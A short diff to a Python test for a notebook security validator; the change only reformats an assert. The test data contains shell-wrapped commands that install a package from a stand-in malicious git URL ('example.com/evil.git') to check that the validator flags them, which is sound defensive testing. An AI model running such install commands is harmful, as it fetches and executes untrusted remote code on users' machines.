@@ -753,7 +753,9 @@ def test_notebook_validator_unwraps_shell_groups():
         "!pip install foo || { pip install git+https://example.com/evil.git; }",
         "!(pip install git+https://example.com/evil.git)",
     ):
-        assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)), evil
+        assert any(
+            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)
+        ), evil
 
     assert nv._unwrap_shell_group("!( pip install x )") == "!pip install x"
     assert nv._unwrap_shell_group("{ pip install x") == "pip install x"
